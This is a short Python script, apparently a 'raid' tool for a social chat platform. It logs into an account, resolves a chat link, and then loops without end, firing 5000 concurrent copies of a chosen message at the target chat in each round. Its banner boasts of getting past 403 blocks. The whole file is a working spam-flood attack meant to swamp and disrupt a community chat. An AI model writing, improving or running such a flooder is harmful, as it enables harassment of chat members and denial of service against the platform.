from lib import Client
from os import system, name
from lib.helpers import device_id
import asyncio
import aiohttp
print("RAID SYNC NO 403")


async def login():
    email = input("EMAIl>> ")
    password = input("Password>> ")
    async with aiohttp.ClientSession() as session:
        client = Client(session=session,
                            simple_account={
                                            "email": email,
                                            "password": password,
                                            "device_id": device_id()
                                            })
        await client.login()

        await getgey(client)

async def kros(message_type, message, chat_id, community_id, client):
    await client.send_message(chat_id=chat_id, message=message,
                              message_type=message_type,
                              community_id=community_id)


async def getgey(client):
    client = client
    message = input("Message>> ")
    message_type = input("Type message>> ")
    link = input("Link chat >> ")
    result = await client.link_resolution(link)
    community_id = result["linkInfoV2"]["path"].split("/")[0]
    chat_id = result["linkInfoV2"]["extensions"]["linkInfo"]["objectId"]
    while True:
        await asyncio.gather(*[asyncio.create_task(kros(chat_id=chat_id, message=message, message_type=message_type, community_id=community_id.replace("x", ""), client=client)) for _ in range(5000)])
    
    
async def main():
    print("NO 403 RAID")
    await login()



if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())
    


